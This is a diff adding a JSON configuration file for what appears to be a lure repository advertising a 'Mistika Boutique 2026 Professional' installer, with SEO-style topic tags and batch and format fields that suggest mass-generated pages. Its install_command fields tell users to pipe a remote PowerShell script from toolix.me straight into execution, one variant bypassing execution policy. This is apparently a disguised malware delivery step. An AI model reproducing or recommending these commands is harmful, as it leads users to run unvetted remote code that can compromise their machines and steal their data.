@@ -1,0 +1,26 @@
+{
+  "repo": "Mistika-Boutique-2026-Professional-Setup",
+  "product": "Mistika Boutique 2026 Professional Setup",
+  "product_title": "Mistika Boutique 2026 Professional",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-mistika-boutique",
+    "mistika-boutique-app",
+    "desktop-software",
+    "repository-readme",
+    "install-guide",
+    "mistika-boutique-desktop-tool",
+    "mistika-boutique-windows-tool",
+    "mistika-boutique",
+    "mistika-boutique-desktop-2026",
+    "windows-11"
+  ],
+  "site": "toolix.me"
+}
